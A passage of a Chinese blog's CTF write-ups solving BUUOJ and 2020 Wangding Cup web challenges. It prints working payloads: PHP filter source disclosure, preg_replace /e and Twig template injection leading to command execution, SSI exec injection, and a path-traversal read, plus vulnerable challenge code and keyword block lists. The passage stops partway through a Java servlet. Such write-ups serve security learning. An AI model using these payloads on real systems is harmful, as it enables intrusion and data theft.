class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>要让$text变成文件类型，使用为data协议或者远程文件包含,提示next.php文件，使用为协议读取文件源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I%20have%20a%20dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>

<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//next.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看见正则匹配函数有<code>/e</code>选项，可以命令执行 <a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">参考文章</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;assert(system(&quot;cat%20&#x2F;flag&quot;));</span><br></pre></td></tr></table></figure>



<h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>还是和之前The mystery of ip一样的界面。flag界面变成了输入username</p>
<p><img src="/pic/163.png" alt=""></p>
<p>测试xss，sql注入，均无果。猜测可能还是ssti</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入&#123;7*7&#125;，无果再次测试&#123;&#123;7*7&#125;&#125;，发现返回了49,继续测试&#123;&#123;7*&#39;7&#39;&#125;&#125;，返回49</span><br></pre></td></tr></table></figure>

<p>附上测试流程</p>
<p><img src="/pic/162.png" alt=""></p>
<p>应该是twig</p>
<p>找payload，在<a href="https://www.cnblogs.com/cioi/" target="_blank" rel="noopener">Cxlover师傅的博客</a>找到了payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;falg&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>扫描目录发现备份文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn&#x2F;index.php.swp (CODE:200|SIZE:1153)</span><br><span class="line">+ http:&#x2F;&#x2F;69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn&#x2F;index.php (CODE:200|SIZE:1048)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class="line">		$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		<span class="keyword">return</span> sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">'6d0bc1'</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span><br><span class="line">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="string">'</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="string">'username'</span>].<span class="string">'&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先附上爆棚md5脚本(python写出来总是出错)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">1000000000</span>;$i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(strcmp(md5($i),<span class="string">'6d0bc1'</span>)==<span class="number">26</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($i);  </span><br><span class="line">      	<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//int(2020666)</span></span><br></pre></td></tr></table></figure>

<p>username数据会被写入到文件中，文件是shtml，百度一波寻找漏洞</p>
<p><a href="https://www.xuebuyuan.com/693626.html" target="_blank" rel="noopener">ssi语法</a></p>
<p>直接读取根目录`/flag文件发现flag不存在，于是查看目录，发现flag在当前文件下。</p>
<p>username输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;ls ..&#x2F;&quot;--&gt;</span><br></pre></td></tr></table></figure>

<p>随后访问shtml文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello,flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public</span><br></pre></td></tr></table></figure>

<p>直接访问flag_990c66bf85a09c664f0b6741840499b2文件即可</p>
<h2 id="未完成-EzPHP"><a href="#未完成-EzPHP" class="headerlink" title="[未完成]EzPHP"></a>[未完成]EzPHP</h2><p>查看源码发现提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- Here is the real page &#x3D;w&#x3D; --&gt;</span><br><span class="line">&lt;!-- GFXEIM3YFZYGQ4A&#x3D; --&gt;</span><br></pre></td></tr></table></figure>

<p>base32解码后得到<code>1nD3x.php</code></p>
<p>访问即可得到源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;1nD3x.php&quot;;</span><br><span class="line">$shana &#x3D; $_GET[&#39;shana&#39;];</span><br><span class="line">$passwd &#x3D; $_GET[&#39;passwd&#39;];</span><br><span class="line">$arg &#x3D; &#39;&#39;;</span><br><span class="line">$code &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#39;You seem to want to do something bad?&#39;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; </span><br><span class="line">        $file &#x3D; $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#39;fxck you! What do you want to do ?!&#39;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))  </span><br><span class="line">            die(&#39;fxck you! I hate English!&#39;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || </span><br><span class="line">preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#39;&#39;, $arg); </span><br><span class="line">&#125; ?&gt;</span><br><span class="line">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</span><br><span class="line">Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯2020记录</title>
    <url>/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="青龙组-filejava"><a href="#青龙组-filejava" class="headerlink" title="青龙组 filejava"></a>青龙组 filejava</h2><p>上传一个文件后得到下载地址，下载地址可以随意读取文件，读取为目录时报错，得到绝对路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.io.FileNotFoundException: &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;upload&#x2F;15&#x2F;12&#x2F;..&#x2F;..&#x2F;.. (Is a directory)</span><br><span class="line">	java.io.FileInputStream.open0(Native Method)</span><br><span class="line">	java.io.FileInputStream.open(FileInputStream.java:195)</span><br><span class="line">	java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:138)</span><br><span class="line">	java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:93)</span><br><span class="line">	cn.abc.servlet.DownloadServlet.doPost(DownloadServlet.java:43)</span><br><span class="line">	cn.abc.servlet.DownloadServlet.doGet(DownloadServlet.java:22)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:634)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:741)</span><br><span class="line">	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>读取web.xml文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><del>读取upload.jsp时候发现提示，flag在/flag中</del>比赛时可以读到，buu读不到。</p>
<p>根据web.xml下载java文件进行审计</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//DownloadServlet.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DownloadServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String fileName = request.getParameter(<span class="string">"filename"</span>);</span><br><span class="line">        fileName = <span class="keyword">new</span> String(fileName.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>);</span><br><span class="line">        System.out.println(<span class="string">"filename="</span> + fileName);</span><br><span class="line">        <span class="keyword">if</span> (fileName != <span class="keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">"flag"</span>)) &#123;</span><br><span class="line">            request.setAttribute(<span class="string">"message"</span>, <span class="string">"禁止读取"</span>);</span><br><span class="line">            request.getRequestDispatcher(<span class="string">"/message.jsp"</span>).forward(request, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String fileSaveRootPath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">            String path = <span class="keyword">this</span>.findFileSavePathByFileName(fileName, fileSaveRootPath);</span><br><span class="line">            File file = <span class="keyword">new</span> File(path + <span class="string">"/"</span> + fileName);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                request.setAttribute(<span class="string">"message"</span>, <span class="string">"您要下载的资源已被删除!"</span>);</span><br><span class="line">                request.getRequestDispatcher(<span class="string">"/message.jsp"</span>).forward(request, response);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String realname = fileName.substring(fileName.indexOf(<span class="string">"_"</span>) + <span class="number">1</span>);</span><br><span class="line">                response.setHeader(<span class="string">"content-disposition"</span>, <span class="string">"attachment;filename="</span> + URLEncoder.encode(realname, <span class="string">"UTF-8"</span>));</span><br><span class="line">                FileInputStream in = <span class="keyword">new</span> FileInputStream(path + <span class="string">"/"</span> + fileName);</span><br><span class="line">                ServletOutputStream out = response.getOutputStream();</span><br><span class="line">                <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">boolean</span> var11 = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> len;</span><br><span class="line">                <span class="keyword">while</span>((len = in.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                in.close();</span><br><span class="line">                out.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findFileSavePathByFileName</span><span class="params">(String filename, String saveRootPath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">        <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">240</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        String dir = saveRootPath + <span class="string">"/"</span> + dir1 + <span class="string">"/"</span> + dir2;</span><br><span class="line">        File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ListFileServlet.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListFileServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ListFileServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String uploadFilePath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">        Map&lt;String, String&gt; fileNameMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        String saveFilename = (String)request.getAttribute(<span class="string">"saveFilename"</span>);</span><br><span class="line">        String filename = (String)request.getAttribute(<span class="string">"filename"</span>);</span><br><span class="line">        System.out.println(<span class="string">"saveFilename"</span> + saveFilename);</span><br><span class="line">        System.out.println(<span class="string">"filename"</span> + filename);</span><br><span class="line">        saveFilename.substring(saveFilename.indexOf(<span class="string">"_"</span>) + <span class="number">1</span>);</span><br><span class="line">        fileNameMap.put(saveFilename, filename);</span><br><span class="line">        request.setAttribute(<span class="string">"fileNameMap"</span>, fileNameMap);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">"/listfile.jsp"</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//UploadServlet.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItem;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileUploadException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Sheet;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Workbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UploadServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse 